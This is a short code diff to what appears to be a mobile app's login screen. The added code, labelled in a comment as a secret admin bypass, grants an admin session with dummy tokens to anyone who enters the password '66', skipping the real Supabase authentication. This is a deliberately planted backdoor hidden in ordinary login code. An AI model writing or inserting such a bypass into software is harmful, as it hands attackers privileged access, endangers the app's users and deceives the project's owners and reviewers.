@@ -11,6 +11,16 @@ export default function LoginScreen({ navigation }: any) {
   const setSession = useAuthStore((state) => state.setSession);
 
   const handleLogin = async () => {
+    // Admin Bypass Secreto
+    if (password === '66') {
+      setSession({
+        user: { id: 'admin', email: 'admin@debug.local', role: 'admin' },
+        access_token: 'debug',
+        refresh_token: 'debug',
+      } as any);
+      return;
+    }
+
     setLoading(true);
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
